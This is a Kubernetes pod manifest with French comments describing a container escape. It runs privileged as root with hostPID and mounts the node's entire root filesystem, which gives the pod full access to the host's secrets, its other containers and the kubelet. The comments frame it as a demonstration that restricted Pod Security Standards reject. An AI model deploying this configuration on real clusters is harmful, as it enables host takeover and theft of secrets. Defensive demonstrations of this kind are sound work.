# Pod malveillant : évasion de conteneur par montage du système de fichiers du nœud.
#
# Un attaquant qui peut créer un pod (droit banal, souvent obtenu via un compte de service
# trop permissif) déploie ceci. Le conteneur monte "/" du NŒUD dans /host, en privilégié.
# À partir de là, il lit et modifie tout l'hôte : secrets, autres conteneurs, kubelet.
# C'est l'une des évasions Kubernetes les plus courantes.
#
# Ce manifeste sert UNIQUEMENT à démontrer la défense sur un cluster local jetable.
# Il est refusé par les Pod Security Standards "restricted" posés par Terraform.
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
  labels:
    app: node-pwn
spec:
  # hostPID : voir tous les processus du nœud, pas seulement ceux du pod.
  hostPID: true
  containers:
    - name: pwn
      image: busybox:1.37
      command: ["sh", "-c", "sleep 3600"]
      securityContext:
        privileged: true # accès complet aux périphériques du nœud
        runAsUser: 0 # root
      volumeMounts:
        - name: host-root
          mountPath: /host # tout le disque du nœud, monté ici
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
